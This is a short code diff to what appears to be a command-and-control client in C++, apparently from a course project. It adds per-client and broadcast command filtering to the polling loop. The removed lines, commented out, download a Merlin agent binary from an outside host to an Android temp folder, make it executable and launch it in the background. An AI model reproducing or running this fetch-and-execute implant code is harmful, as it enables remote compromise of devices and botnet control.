@@ -232,8 +232,8 @@ int main() {
         CLIENTNUMBER == 1;
     }  */
 
-    //cout << "got here" << endl;
 
+    //For testing, replace with current OS
     if (os_name == "Linux") {
         while(1)
         {
@@ -255,7 +255,10 @@ int main() {
             }
 
             //Wait to see if the command is updated
-            if(newCmd.command == LASTCOMMAND)
+            //The command is for the client or for all
+            if(newCmd.command == LASTCOMMAND && 
+                (newCmd.ClientNumber == CLIENTNUMBER || 
+                    newCmd.ClientNumber == '*' ))
             {
                 //wait 5 seconds to check for update
                 this_thread::sleep_for(chrono::seconds(5));
@@ -272,11 +275,6 @@ int main() {
                 }
             }
         }
-        /*string merlin = "/data/local/tmp/merlin";
-
-        download_file("http://cs4001.root.sx/android/merlinAgent-Android-arm", merlin);
-        system(("chmod +x " + merlin).c_str());
-        system(("cd /data/local/tmp && nohup " + merlin + " &").c_str());*/
 
     } else {
         cout << "Architecture not supported" << endl;
